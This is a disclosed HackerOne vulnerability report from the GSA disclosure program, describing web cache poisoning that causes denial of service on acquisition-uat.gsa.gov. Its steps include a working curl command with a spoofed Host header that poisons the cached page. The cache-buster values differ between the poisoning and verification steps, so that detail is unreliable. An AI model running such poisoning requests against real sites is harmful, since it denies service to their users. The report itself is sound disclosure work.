---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1346618'
original_report_id: '1346618'
title: Web Cache Poisoning leading to DoS
weakness: Uncontrolled Resource Consumption
team_handle: gsa_vdp
created_at: '2021-09-21T15:28:13.831Z'
disclosed_at: '2021-11-08T04:06:31.854Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 15
asset_identifier: acquisition-uat.gsa.gov
asset_type: URL
max_severity: critical
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Web Cache Poisoning leading to DoS

## Metadata

- HackerOne Report ID: 1346618
- Weakness: Uncontrolled Resource Consumption
- Program: gsa_vdp
- Disclosed At: 2021-11-08T04:06:31.854Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
`acquisition-uat.gsa.gov` is vulnerable to web cache poisoning that can lead to Denial of Service (DoS) in the application.

## Steps To Reproduce:
1. Visit https://acquisition-uat.gsa.gov/?letme=4449 to make sure the service is available.
*Note: `letme=4449` is used as cache buster as we do not want to poison the application without parameter.*
2. Poison the link using `curl` command
```
curl https://acquisition-uat.gsa.gov/\?letme\=4447 -H "Host: acquisition-uat.gsa.gov:8888"
```
3. Visit https://acquisition-uat.gsa.gov/?letme=4449 to verify that application is in the state of DoS as it attempts to make plenty of requests to `acquisition-uat.gsa.gov:8888`.

## Impact

The attacker can carry out web cache poisoning to prevent others from accessing the application.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
